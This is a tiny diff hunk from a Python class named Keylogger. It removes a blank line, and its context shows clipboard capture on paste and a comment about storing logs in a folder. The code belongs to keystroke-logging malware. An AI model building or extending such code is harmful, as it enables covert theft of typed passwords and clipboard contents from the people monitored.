@@ -22,7 +22,6 @@ class Keylogger:
             r"'\x16'": "\n[Pasted: " + self.getClipBoard() + "]\n"
         }
         self.standardkey = True
-
         # Make a folder to store the logs,
         # if the folder already exists continue
         try:
